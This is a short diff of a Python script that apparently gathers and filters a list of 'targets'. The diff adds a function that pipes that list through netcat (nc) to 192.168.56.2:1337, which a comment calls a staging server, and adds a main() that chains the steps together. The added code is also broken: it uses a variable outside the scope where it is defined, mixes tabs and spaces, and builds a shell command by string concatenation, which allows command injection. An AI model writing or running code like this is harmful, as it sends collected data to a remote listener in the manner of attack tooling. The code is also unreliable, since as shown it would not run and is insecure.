@@ -45,5 +45,16 @@ def get_unwawnted(potential_targets):
 	print(potential_targets)
 	return potential_targets
 
-potential_targets = (get_targets())
-get_unwawnted(potential_targets)
+def nc_sender():
+#given a list of targets, send it to the staging server
+
+    sender = "echo " + targets + " | nc 192.168.56.2 1337"
+	subprocess.call(sender, shell=True)
+
+def main():
+	potential_targets = (get_targets())
+	targets = get_unwawnted(potential_targets)
+	nc_sender()
+
+if __name__ == "__main__":
+	main()
